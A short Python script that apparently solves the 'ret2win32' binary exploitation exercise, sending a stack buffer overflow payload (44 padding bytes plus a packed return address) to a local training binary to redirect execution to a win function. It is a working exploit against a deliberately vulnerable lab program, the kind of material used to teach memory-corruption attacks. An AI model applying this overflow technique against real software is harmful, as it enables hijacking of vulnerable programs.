import subprocess
from pwn import p32

bin = "./ret2win32"

# insert the address of ret2win
addr = 0x0804862c
prepd_addr = p32(addr)

payload = b"A" * 44 + prepd_addr

result = subprocess.run(
    [bin],
    input=payload,
    text=False,
    capture_output=True
)

print(result.stdout.decode())
